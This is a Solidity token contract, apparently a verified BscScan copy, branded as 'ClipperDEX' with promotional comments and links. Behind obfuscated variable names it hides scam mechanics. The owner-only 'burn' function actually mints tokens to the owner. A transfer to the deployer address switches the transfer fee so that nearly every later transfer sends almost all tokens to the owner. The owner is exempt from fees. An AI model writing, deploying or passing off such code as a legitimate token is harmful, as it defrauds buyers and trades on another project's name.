/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

////////////////////////////////////////////////////////////////////

//ClipperDEX
//A decentralized exchange that's built for retail traders. Join the community:. Built by ShipyardSW
//The fall of FTX is a stark reminder that DEXs, not CEXs, is the way forward.
//Tune in to mattdeible, odosprotocol on 'WTF Crypto' as he dives in on DEX Aggregators, 
//how they work to get the best value for traders 👇
//https://clipper.exchange/
//https://discord.gg/clipper
//https://twitter.com/Clipper_DEX
////////////////////////////////////////////////////////////////////
//
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;
contract ClipperDEX {
uint8 public constant decimals = 18;
string public  name = "ClipperDEX";
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  CAUCBY = 1000000000000000000;
uint256 private  WOQNHP = 10000000000000;
address public owner;
string public  symbol = "ClipperDEX";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => uint256) public balanceOf;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  VPMCBN = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  KLQKYI = address(0);
uint256 public constant DHRIFW = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  NWQIQF = address(0);
address private  RSIYDW = address(0);
uint256 private  YINDEN = 1000000000000000000000;
address private  DVAIFO = address(0);
uint256 private  TNBDAC = 1000000000000000000;
uint256 private  XFYEBG = 100000000;
uint256 private  CKCAFI = 1000000000000000;
uint256 private  HBRENG = 10000000000;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getNWQIQF() private returns (address) {
return NWQIQF;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LPDKAQ");
require(to != address(0), "LPDKAQ");
require(amount <= balanceOf[from], "LPDKAQ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* DHRIFW/CAUCBY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==VPMCBN){
CAUCBY = DHRIFW+2;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getHBRENG() private returns (uint256) {
return HBRENG;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getTNBDAC() private returns (uint256) {
return TNBDAC;
}

function _getCKCAFI() private returns (uint256) {
return CKCAFI;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tLPDKAQ 0");
require(spender != address(0), "fLPDKAQ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
constructor () {
VPMCBN = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getXFYEBG() private returns (uint256) {
return XFYEBG;
}

function _getRSIYDW() private returns (address) {
return RSIYDW;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getYINDEN() private returns (uint256) {
return YINDEN;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getKLQKYI() private returns (address) {
return KLQKYI;
}

function _getDVAIFO() private returns (address) {
return DVAIFO;
}

function _getWOQNHP() private returns (uint256) {
return WOQNHP;
}


}